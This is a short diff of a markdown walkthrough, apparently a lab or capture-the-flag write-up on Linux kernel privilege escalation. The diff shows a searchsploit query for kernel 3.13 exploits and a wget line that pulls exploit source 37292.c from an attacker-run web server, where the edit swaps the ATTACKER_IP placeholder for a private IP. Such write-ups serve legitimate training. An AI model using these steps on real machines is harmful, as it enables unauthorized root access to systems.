@@ -168,7 +168,7 @@ searchsploit linux | grep -i 3.13 | grep -i kernal
 
 ```bash
 python3 -m http.server 8000
-wget http://<ATTACKER_IP>:8000/37292.c
+wget http://<192.168.10.14>:8000/37292.c
 ```
 
 ### Compile & Execute
